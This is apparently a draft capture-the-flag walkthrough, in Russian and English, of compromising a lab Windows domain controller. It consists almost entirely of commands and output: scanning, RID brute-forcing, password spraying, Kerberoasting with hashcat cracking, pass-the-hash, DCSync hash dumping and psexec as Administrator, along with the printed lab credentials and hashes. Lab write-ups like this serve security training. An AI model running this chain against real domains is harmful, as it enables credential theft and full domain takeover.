#Черновик
┌──(jekawhitehat㉿kali)-[~/pen]
└─$ bash nmap.sh 10.114.131.210                                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-20 05:24 -0400
Nmap scan report for 10.114.131.210
Host is up (0.089s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-20 09:25:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2026-09-19T09:19:02
|_Not valid after:  2027-03-21T09:19:02
|_ssl-date: 2026-09-20T09:26:42+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-20T09:26:02+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49736/tcp open  msrpc         Microsoft Windows RPC




┌──(jekawhitehat㉿kali)-[~]
└─$ nxc smb 10.114.131.210 --generate-hosts-file hosts


┌──(jekawhitehat㉿kali)-[~]
└─$ cat hosts            
10.114.131.210     DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL DC01



┌──(jekawhitehat㉿kali)-[~/pen]
└─$ nxc smb 10.114.131.210 -u 'guest' -p '' --rid-brute > rid_brute.txt

┌──(jekawhitehat㉿kali)-[~/pen]
└─$ cat rid_brute.txt | grep "SidTypeUser" | cut -d'\' -f2 | cut -d' ' -f1 > usernames.txt

┌──(jekawhitehat㉿kali)-[~/pen]
└─$ kerbrute passwordspray --domain soupedecode.local --dc 10.114.131.210 --user-as-pass usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/20/26 - Ronnie Flathers @ropnop

2026/09/20 05:37:17 >  Using KDC(s):
2026/09/20 05:37:17 >   10.114.131.210:88

2026/09/20 05:37:18 >  [+] VALID LOGIN:  ybob317@soupedecode.local:ybob317
2026/09/20 05:37:29 >  Done! Tested 1069 logins (1 successes) in 11.929 seconds

Login: ybob317
Pass: ybob317

impacket-smbclient ybob317:ybob317@10.114.131.210
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
 shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users

Далее я проверил папку backup - доступ ограничен, а в папке Users на рабочем столе ybob317 лежал user.txt

28189316c25dd3c0ad56d44d000d62a8





┌──(jekawhitehat㉿kali)-[~/pen]
└─$ nxc ldap 10.114.131.210 -u ybob317 -p 'ybob317' --kerberoasting output.txt
LDAP        10.114.131.210  389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.114.131.210  389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
LDAP        10.114.131.210  389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.114.131.210  389    DC01             [*] Total of records returned 5
LDAP        10.114.131.210  389    DC01             [*] sAMAccountName: file_svc, memberOf: [], pwdLastSet: 2024-06-17 13:32:23.726085, lastLogon: <never>
LDAP        10.114.131.210  389    DC01             $krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$c8da340a870097b681f9ff025b8ee24e$21a3f19dcda869e324001a65f01e7726fe92b627bf570b59242e4ba830afc55ee6c3275851588784b50921582824a47fb0ca139f3c9643ffa6514031f50cd5fa7ea82f363360f8713479ebb3ed32ccf2cf4ed2baef0ce4da251dd8c90c65f4fa8efdbc19f14ff60d43ca2596ba5edff107918449c1f712fae5840193e2a0b57fbabf6995ca0b1f01592e9b96c678dd18e20cd040d7d682ae57b794f9008806a6768be3b6bff03eb62321fced012aecd9c2d06b85b14b66b3aa5858cab8d1945e29432efc2399b744e439e9446b8e0820ebc40be6403c95db2712d9df1b53047c5d4f64bb81ef41c09c5161260472538cd0ca53c47fba3bbbe853280b4c4e77ce15ef60e2c7a23f4c494b480d8deb9866b641e536d46b296a4ecf56c2ea6bcce1be552b1b5ece892c5903a9b9c18e7d35aa198685aeae0360fd2eeb08e35d5af74f0db06dc6d57226a1ae56d3a8b4412bc6f991926e87d4639029a639a45d2bf12451caf17651b3b2b4368fcb9c53632d50938146b390cf61755d8b118fe611a62ba90e56132fcd4e65e51b36010483c8a7d1b3f74eef8b32d0f35b942c46bc412c7a3b92bb4bd1f4504d27a3a9d70a1870482815b4387a322f39e97747802392d630abde840a2692501f65293ae1c3cf7c25c0ec15477fab4d96123bcbc3b1a7354500ebd44489b6a21fc3fdfbce0f04300a58762728900f00c972ffa6fa74916b103f20a23a74bfd3a28f08d47f336932aa3b407993b42c6d0f30fc7fb9bfd2df9f09c6605f115c6e25d4f4ec1506bf7f3776ee81a3c9111e0ce3112ff05515979197bd30a48445fe100867309b2c36d0962b02f6f4d7744b84ee087b10a196dbc76a684fd380acea5f521c29c9d0de24b57b8bdcd034eead2e0e0abb8f1188484fc7a02c04f317849528250993768851619a972d747240139846ba9afa750b07be913010453c62706e0abf866001873b9842026f6dc21a2357ffb0eb5c24c59baf7717db21f16d919f35bdc890fa21ab71bb866c4b2010b15e40e5d8963580eeffa554db2371c42fa62a5bfb3431b56ddd053d356dde95ff96d77d7a379907e21f1d7121e92a8709f991121491413490a70551a71315528620424d3af0c6be4a1d38dafa3e9ba4b1e458001377b0d55289cd24258bdc5d8ee332c7a55826e6b7f855c0e608b2ee1c2233094b0b0ef54c57568f8912657f8bdcc89e57b5975b4bdf552ac01cf06b161efd6f4a604bb42c0d58be9a659d3b49094d8799863c100fcd412b6bb5e0ccfdfbea30b73017126d606844991452f5f113df7b8edc791cf9c98535a68e0ec9b07d859f75e42532fa5069ac182902c887ec790069d17e50ab9bfe2e4e2b7036ae3fb6072c249f3f7a1b4938383febcd94b1d4a1da49300ae2c32b438a7b084acdd9dbf650d4875f388ab3afbe69999f0a99bb772e1e913c4b63ac4c209bf0230ad93afdcdde5474c5a411dff06c4fddcdb44ee8fe22b1b4b2                                                                                     
LDAP        10.114.131.210  389    DC01             [*] sAMAccountName: firewall_svc, memberOf: [], pwdLastSet: 2024-06-17 13:28:32.710125, lastLogon: <never>
LDAP        10.114.131.210  389    DC01             $krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\firewall_svc*$ed8d08ecc067589b993019f834b0f878$8993b6947e1dc7c815a3d4b593df5d351c098dbf477ce07ac7c9529fb2284e5789bb3584a00225b4b0e92a72412d4eac754e2c3107fe77a4dfc35948f92928bd31dbd74ec76f4027057807453453ae7347d9ff9650a8e5be6dc7380e333c4a0dba5ee8235579e949b4e56548db7026a73d77f8f5d4e456255f1a94967adf48f2c3e3d7a60c1882eb8b1fd0cf20bd224595381c6d216fb8e2444a7c1fa2aee511265d3b4d412efc9c11d89a15551f2d352ac38db12fa74955ca7d18c6064897a16b9eaa4d851ca10a15475a2c646d14f27c0083afaeae273ae6931fc91e54be8ceb868bcb081ea079db22a5b9a6ae71f9172eafd8b663a0e8b0a72cb0c3ad3896d28c9f088ec2451ed9b588aeaf33dc0275cd52aed03e6c2e1155cebaf067bcb262489333d2126cc7a8272dfb5e593fc958e777dc56f191b1048c489a446ca91e0342d24d7db43e129b479d3fe76b8769a4b305fe77dcc371324a66bba4236a17060790488a35774a8ced85820f500d04de5d0e74a32b76ab3b2ddfedbdf09cd48bf37f1321c8778101d91f9bd54017aa04c3ec82950d62d7d8467873d43c73975a04d504ea58842a5d2223037632b26302c204bce710a5ed55e42aadc1eb0323502898359a14c54e52f65841fc19e1ad51b60396bb3046022d01cccd7eb062efd633d909c84e0021c5a9acab89042db26a7269b4d360bc4a8bbf3763ff014a6745997d9ed6f9cb34715fa302f4e585eaf642b8397d0e5af59120d762d0ddfe719751b4367470dd443480300b672ed1fd04d7fb22388543b861d49fb8feab4e8b7ff589841497be451fe59024fc37d2a356c6383731a1019f7bed73f91bbeddd0dc3149e700ff07fe9590b9716ee894079764596025284ab931d3359725d9978e7ce6c1bb60e24d046d38f4937d73f1bdfdd49cc3922e4cb90e1239a8cda385c4827edee4e758d9c091ff6e483f8cc5e0bdcfab660ee51b3272ef6f9627a650936e482a2ad7e9f20f6685b5349493235756e1beb4de31558cf4884e251cbf610583ceaa56fb12767ecc1fbc7a8b36d428c1cce7192b33729f918f931f2dfde1cff9b13a8ce015f38786399ce78fd1dd48c443069df44c380df21567a7e48e13d05aac51bd7bab4901aae83d609194608f16862e19e362da8d6e161f731e46cfdbb1719820464ec077b61977a37227772c7ab828be3bee83d5d505d07dca1651b2cf6909d87316a14f7ddd25865ee18616f6faf3ef036b42270f9b83ee7b310f234df8b3ed57598dd74389487050608fe7eb4cafeb6daf5c8a0608feea35ad3a6d111dfb097f526ffce279ed54960ea76ee97e9568fc22172b4aef63c8a5e44c8ce4033e65048e2956b541866a7f57cce63e2d4de73c00f1aefb1e1fc04d1f938026589d96db7c3f2cb993451e80fa4a7daa5d0972905d741739650988273e602670ff9677e435adfdca47aeb70c0fb13dc1c465879e2dc11f1b60a37356872a3ff8                                                                             
LDAP        10.114.131.210  389    DC01             [*] sAMAccountName: backup_svc, memberOf: [], pwdLastSet: 2024-06-17 13:28:49.476511, lastLogon: <never>
LDAP        10.114.131.210  389    DC01             $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\backup_svc*$5b222f1a01debe1ee40438b2c3d2c2c0$0134f4ee40232369e3feb9e36fde4b454c24e99ad893e28c9e3bfdf5bc15c8d434c3ed1e6c8c2b9ab29ebcbaa331a8905bbec6fbd7fd15d1d71835cefc6e7962385d1507759a2dcf6425a62a247e476ccb6ae37c26e818802aa12cbe76657ae52ac96316c03dbc1c89e76a1a88f49eee14c58d39257daa2c97a537cfb5cb3cbafb7c9aae22080447611ed6b4b1cfb6a2b031c388b4286d75144edd754cb6aa69865739eb34947029d3e24a9c0fc0faa32c21db18d625f0b93538c1aaa06e2db7cb1cae1d42d34e681203a75815d4a8f027955cba37e3528ee84259b7f1fffb0d704ba05e08a418ded08c517a0c709ba467e02f79b984e000bf83b9d0415ad76c3539b30464e68ec609ed508c7421f927d7a3a29923165ed7914e7f5bcb1215333d56f619fad0de2399c8204210ecc98ba67f5446700cfeef3805f077031eaf568a39f8b97fb3e8b3b14a71c7875531259b24d17a2075eb4123f95caa0f8505f88389fb58684bb7f9be360c9f0e1449a6783e9a68c942d8fd0b0ff81ca242b16716935b021bb1398328d8a4ffd2ccc0697c36cbb045d3f7c51fc32bc5a952efe84790db688e8a13633f11fe055ba3f0ac04b14daa1fb9eabeddf51bd2f4fe429fb627e08a7c62678407571cdb3ecc5deacb4233c8f18a7b9356f852fa4b8611a63910231de3aad21a0f96357c19a2edccc827d240b9804ce5b5b0e627633e5673a4795d12752c6c319311f9f204b03113f3006dfcf12fcd44b2fdc572a6939034d4d40fc081b7e3177fe8ba74ddb3defe7436b1acce989821acaf0acf71ebd9c4b8dfb044d01ef1c87ec4c02148817debbad3fc313c357941b971a2558c54818251f7ef8f798d6f43722152ef2f5c6fc8d70eaa0a01c90c9bfa3b02fbc105062cc12f0fc9a647e5fb67dd6475ee66fd29fa50b65a22ab0e22890b127176187115a3f127db3c883f34b1cb53a8ef2353cdb5387d3988a6e291f3c570f9a2dc4e7af96e7a7d32e7a543b7b27fa62d6407175a4f3379cac5d03d445c6e1a4b531b82f80ceb8ff62da529a3f3225016d893af3388d2a4610d4b1ce7610f398bbcbfb996bf11baa7a1a4d306cd5eff74ba417315d564044339801b912164c8de07876e180df88e848c0c28eaeb2b3e530cc3a848ee42b04e6ed632161fda26485311e8d908d39967fd78550b0db8407485279ae77f845008b45ceae00101731b28f5c64fb52d55afc403fed51eb77a3d7bfa4b340729fa4e58b1e4fc8806453dfee3a87fef96988c81737f72ef0b38270a926f2477f47e9c1f97398437167adc857c9c626f8ac100a1aff63c8d5e715116d0cf1636f2a33fef81d4fa9219c4f50f6f3ac8110eb1899a6cd789bfb1ea1f45fecd42652e90c6df4f267eb3bef90ad08adfe350a818f3c45df22e29ad31f173c0ae8127a0e81d6b444c09ece06d5dc41712241f1d296d158139f90ec7f05c9f4a91fc9691fdb273516286869d3f9b52b09566                                                                                 
LDAP        10.114.131.210  389    DC01             [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2024-06-17 13:29:04.569417, lastLogon: <never>
LDAP        10.114.131.210  389    DC01             $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\web_svc*$bdc318e765566fe6da0fa178061562e9$88bc9e20382eda8f68b2d71dfcd0cc926559ce8e1f52ad0318932e085e6d0f81168b2fd7e7200c65f398920fa311b1e1c78a1e850f6289c5740896ff225b7f7ca24500590c266f7c5394c312e62940dc1bb6c24e1573a31f05b0dcc397ec332963cee75c9029afaa424b25714342094087c4453b81c099412365f33b002e96413da482e55dfe9f53d1df9ab1025175195f2ac40edba2726de23e5562804be10023daf7e285e701c292610ad3ca1bfbc9fe775fbca9c9d636179f65df4a065af8c673db1efe69109fffddb6338c52d157e99186801f27b0e4c027bf47e0fb332eb493927ab87a135b178c4289c630685582bff99147d055c6258f1e9e787b7acb86205ed16f3d47051496b78e1c96b8c9e5dc7780651ec72ffe7bcc89d4acf017d8122c58f0119bfd1ebeb6881280d30867e507b5ece0a297cc97fe2c388a382fe2048f9b7c8b428902fd260c4e8a7c4575342e210646a7f306431f67d1760ef7d56c49c99a97f77aa0bd4239330edd15eeab8ac8cf6f743b63e722a59440c0f61309930d48ff6bcb8f2dbc58e857e0ba014b67c531c22272828fa5ce47e3c71266fb8a58d856a6fb9fd20f12e25af2e0d6accf113577d5a727231cb5d083f2615ffa09d4fc74b0fe503b6492e75926912a21a091a5d3897eadedef440066cc4b434a2e8fdf9497be58178e93ec81ddf19e936bb1ef3d7ce44946f06c76e0578fdf6deea63c5fb6372d1377451fc2f61f472c479dca7bd48f1405173b2b1790c22fea25e6b7c178917bfb5f5390549b1d2a11926726cb4de4e2a3f18dd527a4ee0bdab6c6d99fe45e96f29847d6399f78df6c24a94de685ef3ec6199f0b947d60e0605ab97ad03beec7cbdc9945046815c18527f1eeba0b08ee32c03dfaaff93598a66b9121fe78e6d986a11874fa7228555265e79d2856a619cf5c63e3f911c9796b19e15d79eacb71af6afe8812d1d0c47f42c81e6138e1bbec953802060f651aa28e037a8819861723b8df49eda349c983b2d9be47fbbc7839d2a0c909c9b3e50d80df63d478a399e2022d06ebc4afbc13f195447adbd4a44258759d4656ab4f30f76f042519ff50394b3d6fc77c2f11c5bcf8a7adef300539341ea4b50dd5f7f1bb53d9a751d7d08faf62fe014bb35df562b3c0e2f69cf0bab41fa9cd195de07a4cce4cc79544bde1798304a3b470af770bc7944c0d59f16c49298c2e0472f8abcc85f29f2fc720cd864f34f1aa372acef101a415b2044db09b3e5e6bc65701863f0e9e9167d9136d05aafd2549eef33a569d1fc1089ffbf0933517b981c1230ba12d33bc1a07c95e2e5512b4edb40a97c70e1efbab6e32094449e38b247abfb945fb0b376d91795611056a9660b7a39292e3204ccf9f275ae0728c5587df6751be795692d3377332f17b88631fcebd58477d9ec4cc4c02011cb0dbb99ba2bce639ee07e7b4dc2e0ce2107119c10783f2967487f2eb2390827954a359760a75                                                                                       
LDAP        10.114.131.210  389    DC01             [*] sAMAccountName: monitoring_svc, memberOf: [], pwdLastSet: 2024-06-17 13:29:18.511871, lastLogon: <never>
LDAP        10.114.131.210  389    DC01             $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\monitoring_svc*$5b42743d8ee0a4adbe66a06cf3f2566f$b48a2cebe19739d259c49ca80a9e60b3600cfe7cb58c6543beb38acd8246d61796adb0b465ebc1854791de927aa25c9e70da41f6986ad464ec81aa2d26a7f740463fd8016ba93791d8501001a593025d00bcd850833858dfc3ef021c0f62a6950d7b5f37d49d52090fb8680a71a09a4bbca51524b34bd8eee615f4a2d7c0ded5355d5ea1af0106aa72362180f3f28b886b78e38521e26d77fdc740c2e3bbd4e4ecda2b6274db1b590ca48626521ccffcc92145d0bb88909fa25a8c818d1e69947015a2ba5ce47c61796b211acbfc9eacdea365db03a3af0bc82ef06315d8b7134fa45778c6de72017f16223127044cd969740511dd4051c71d03a1d36a5bef1127239ba30d32bc719f13513ae5299ebff91eb7e2d78464b5728f3468b914b01a7ebd7cd610785426e55377befd0a551e0e94421e889f756d4eef8049fd68a7f6d2002044f8d92e3249772604ec780be59bb62c97b7bc3804057c2733342696faa8ab41f2e39e431a9f96f8343c4ebf40c6638502bcb63958b43a15f399d076d559424f6fd4914af5aaae01d2ad8e33c269d05b65f945714af7400f43f75d2123dded3163eb5e4aa0051f243453edfa3925dcbc26412664b4232224a52e144ec9b6637ba038f588d73b7e827408d361ef7d4b4ffc9abe93119460631a4c6cca1744ccad2b502a161f3a77119e037acbf204e5a0f49f10430b687017ec3be37e9109d1a53cf02c7b83030a3192b36f50ccf6ffbc2af18fe18145bef37b6c77d07f3d26f473549947a062edd50e015d7d9b7c004f775015fcd77783868ecf2c2080c82b4166ebead44782404aa9f5a5605843fcb5b8b3cc46e9b29f2366fe67589416785ae843090feafac9eba2ba869e7c7ed218c1a92e380ae33b90ae8f57529fc08c5f3e1069eb46fcabef1dd596afacf999a0e3930069dc895568a6ecbfbdd3515e7eb6267f809a4aa6ef97235a825b516d267fcde70487dd4876d3761597a77fb2d7175a809f65574fcfe709a360baff8136aa7f28ec3ba02baba4e2e5af272b85c135a05cdca249915f71d08620f198e39a180f88b307791fb27a9e05bf5635cd1a6c5cc55d02036db2d65c6b8196f8040aa6954fb2021eaee1cd375fa99fc0cf1c5b465d1b009412334a29508e951e8c51340eb1bb892918d28c9538051c5e220c723d5865dabb01e029f02ff429fe9ac976889ffea6609be35d9cf0daea4ece44e9e080b560940f6f90b7558b836de6da50d17ee26261518964bcf1fbde72821201131469e5129f5eaed85bcdf36e8a4f22ea0b02dc9f4bcad4435d1c982d4c638a55cc3ceae46398edbbb80070e02facb759940eea4caa4cbb802d1a45e32de19d37d6b46813c82187f4a19b5d91d4f3ca62a50b96688c429b57b8ee8c6059df0d6d61b8253f8e85ea671b1514a1246b5294635f7f4115e3ec800504de0d19899d6796aab1c608e6fa98c600795ac6ea84cc6f5f45e577416ad155619b1e   


┌──(jekawhitehat㉿kali)-[~/pen]
└─$ hashcat -m 13100 output.txt /usr/share/wordlists/rockyou.txt --force


Получаю ответ
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL\file_svc*$c8da340a870097b681f9ff025b8ee24e$21a3f19dcda869e324001a65f01e7726fe92b627bf570b59242e4ba830afc55ee6c3275851588784b50921582824a47fb0ca139f3c9643ffa6514031f50cd5fa7ea82f363360f8713479ebb3ed32ccf2cf4ed2baef0ce4da251dd8c90c65f4fa8efdbc19f14ff60d43ca2596ba5edff107918449c1f712fae5840193e2a0b57fbabf6995ca0b1f01592e9b96c678dd18e20cd040d7d682ae57b794f9008806a6768be3b6bff03eb62321fced012aecd9c2d06b85b14b66b3aa5858cab8d1945e29432efc2399b744e439e9446b8e0820ebc40be6403c95db2712d9df1b53047c5d4f64bb81ef41c09c5161260472538cd0ca53c47fba3bbbe853280b4c4e77ce15ef60e2c7a23f4c494b480d8deb9866b641e536d46b296a4ecf56c2ea6bcce1be552b1b5ece892c5903a9b9c18e7d35aa198685aeae0360fd2eeb08e35d5af74f0db06dc6d57226a1ae56d3a8b4412bc6f991926e87d4639029a639a45d2bf12451caf17651b3b2b4368fcb9c53632d50938146b390cf61755d8b118fe611a62ba90e56132fcd4e65e51b36010483c8a7d1b3f74eef8b32d0f35b942c46bc412c7a3b92bb4bd1f4504d27a3a9d70a1870482815b4387a322f39e97747802392d630abde840a2692501f65293ae1c3cf7c25c0ec15477fab4d96123bcbc3b1a7354500ebd44489b6a21fc3fdfbce0f04300a58762728900f00c972ffa6fa74916b103f20a23a74bfd3a28f08d47f336932aa3b407993b42c6d0f30fc7fb9bfd2df9f09c6605f115c6e25d4f4ec1506bf7f3776ee81a3c9111e0ce3112ff05515979197bd30a48445fe100867309b2c36d0962b02f6f4d7744b84ee087b10a196dbc76a684fd380acea5f521c29c9d0de24b57b8bdcd034eead2e0e0abb8f1188484fc7a02c04f317849528250993768851619a972d747240139846ba9afa750b07be913010453c62706e0abf866001873b9842026f6dc21a2357ffb0eb5c24c59baf7717db21f16d919f35bdc890fa21ab71bb866c4b2010b15e40e5d8963580eeffa554db2371c42fa62a5bfb3431b56ddd053d356dde95ff96d77d7a379907e21f1d7121e92a8709f991121491413490a70551a71315528620424d3af0c6be4a1d38dafa3e9ba4b1e458001377b0d55289cd24258bdc5d8ee332c7a55826e6b7f855c0e608b2ee1c2233094b0b0ef54c57568f8912657f8bdcc89e57b5975b4bdf552ac01cf06b161efd6f4a604bb42c0d58be9a659d3b49094d8799863c100fcd412b6bb5e0ccfdfbea30b73017126d606844991452f5f113df7b8edc791cf9c98535a68e0ec9b07d859f75e42532fa5069ac182902c887ec790069d17e50ab9bfe2e4e2b7036ae3fb6072c249f3f7a1b4938383febcd94b1d4a1da49300ae2c32b438a7b084acdd9dbf650d4875f388ab3afbe69999f0a99bb772e1e913c4b63ac4c209bf0230ad93afdcdde5474c5a411dff06c4fddcdb44ee8fe22b1b4b2:Password123!!




┌──(jekawhitehat㉿kali)-[~/pen]
└─$ impacket-smbclient file_svc:'Password123!!'@10.114.131.210
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
 shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
 cd backup
[-] No share selected
 use backup
 ls
drw-rw-rw-          0  Mon Jun 17 13:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 13:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 13:41:23 2024 backup_extract.txt
 get backup_extract.txt
 exit

тут какие-то хеши:

┌──(jekawhitehat㉿kali)-[~/pen]
└─$ cat backup_extract.txt 
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

Очищу полученные данны, в один файл отделю логины в файл users1.txt а второй файл только с хешами

И проверю на валидность 
                                                                                                                                                                            
┌──(jekawhitehat㉿kali)-[~/pen]
└─$ nxc smb 10.114.131.210 -u users1.txt -H hashes.txt

SMB         10.114.131.210  445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)







Делаю DCSync:

┌──(jekawhitehat㉿kali)-[~/pen]
└─$ impacket-secretsdump 'soupedecode.local/FileServer$@10.114.131.210' -hashes :e41da7e79a4c76dbd9cf79d1cb325559 -just-dc 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88d40c3a9a98889f5cbb778b0db54a2f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6:::



┌──(jekawhitehat㉿kali)-[~/pen]
└─$ impacket-psexec Administrator@10.114.131.210 -hashes :88d40c3a9a98889f5cbb778b0db54a2f

C:\Users\Administrator\Desktop> type root.txt
27cb2be302c388d63d27c86bfdd5f56a

